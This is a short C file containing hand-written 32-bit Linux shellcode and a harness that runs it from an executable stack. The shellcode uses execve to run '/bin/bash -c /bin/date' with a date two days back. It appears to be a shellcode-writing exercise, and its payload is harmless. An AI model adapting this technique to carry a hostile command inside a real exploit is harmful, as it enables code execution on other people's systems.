// filename: execve-date-shellcode.c
// author: lawly
// gcc -m32 -fno-stack-protector -z execstack -o execve-date-shellcode execve-date-shellcode.c

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
	"\xeb\x2d\x5e\x89\xf7\x31\xc0\x88\x46\x09\x88\x46\x0c\x88\x46\x2a"
    "\x89\x7e\x2b\x83\xc7\x0a\x89\x7e\x2f\x83\xc7\x03\x89\x7e\x33\x89"
    "\x46\x37\x89\xf3\x8d\x4e\x2b\x89\xc2\x31\xc0\xb0\x0b\xcd\x80\xe8"
    "\xce\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x58\x2d\x63"
    "\x58\x2f\x62\x69\x6e\x2f\x64\x61\x74\x65\x20\x2d\x2d\x64\x61\x74"
    "\x65\x3d\x27\x32\x20\x64\x61\x79\x73\x20\x61\x67\x6f\x27\x58\x41"
    "\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44";


int main() {
    printf("shellcode length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
